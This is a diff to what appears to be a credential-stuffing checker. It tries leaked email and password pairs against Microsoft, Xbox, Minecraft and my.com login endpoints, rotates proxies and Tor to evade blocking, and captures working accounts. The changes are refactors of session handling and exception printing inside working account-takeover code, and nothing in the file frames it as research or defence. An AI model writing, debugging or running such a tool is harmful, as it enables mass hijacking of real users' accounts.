@@ -85,7 +85,6 @@ class Capture:
         try:
             out = requests.get(f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={email}&Password={password}", headers={"User-Agent":"MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"}, verify=False).text
             if "Ok=1" in out: return True
-            else: return False
         except: errors+=1
         return False
     
@@ -215,7 +214,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
             return None
 
 def authenticate(email, password):
-    global vm, bad, retries, checked
+    global vm, bad, retries, checked, cpm
     try:
         proxy = getproxy()
         session = requests.Session()
@@ -235,7 +234,7 @@ def authenticate(email, password):
                     mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                     access_token = mc_login.json().get('access_token')
                     if access_token is not None:
-                        mc, capes = account(access_token, session.proxy)
+                        mc, capes = account(access_token, session)
                         if mc != None:
                             Capture.handle(mc, email, password, capes)
                         else:
@@ -260,16 +259,16 @@ def authenticate(email, password):
                 checked+=1
                 if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
     except Exception as e:
-        #print(e)
-        #traceback.print_exc()
-        #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
-        #print("Exception occurred at line:", line_number)
+        print(e)
+        traceback.print_exc()
+        line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
+        print("Exception occurred at line:", line_number)
         if proxytype == "'4'": renew_tor(session.proxies.get('http').split(':')[2])
         retries+=1
         authenticate(email, password)
 
-def account(access_token, proxy):
-    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, proxies=proxy, verify=False)
+def account(access_token, session):
+    r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False)
     capes = ""
     if r.status_code == 200:
         try:
